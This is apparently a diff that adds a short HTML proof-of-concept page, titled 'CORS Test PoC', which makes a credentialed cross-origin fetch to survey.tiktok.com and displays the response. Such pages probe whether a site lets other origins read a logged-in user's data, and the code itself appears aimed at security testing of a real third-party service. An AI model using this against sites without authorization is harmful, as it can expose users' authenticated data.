@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h2>CORS Test PoC</h2>
+
+<script>
+fetch("https://survey.tiktok.com", {
+    method: "GET",
+    credentials: "include"
+})
+.then(response => {
+    document.body.innerHTML += "<p>Status: " + response.status + "</p>";
+    return response.text();
+})
+.then(text => {
+    const pre = document.createElement('pre');
+    pre.textContent = text;
+    document.body.appendChild(pre);
+})
+.catch(err => {
+    document.body.innerHTML += "<p style='color:red'>Errore: " + err + "</p>";
+});
+</script>
+
+</body>
+</html>
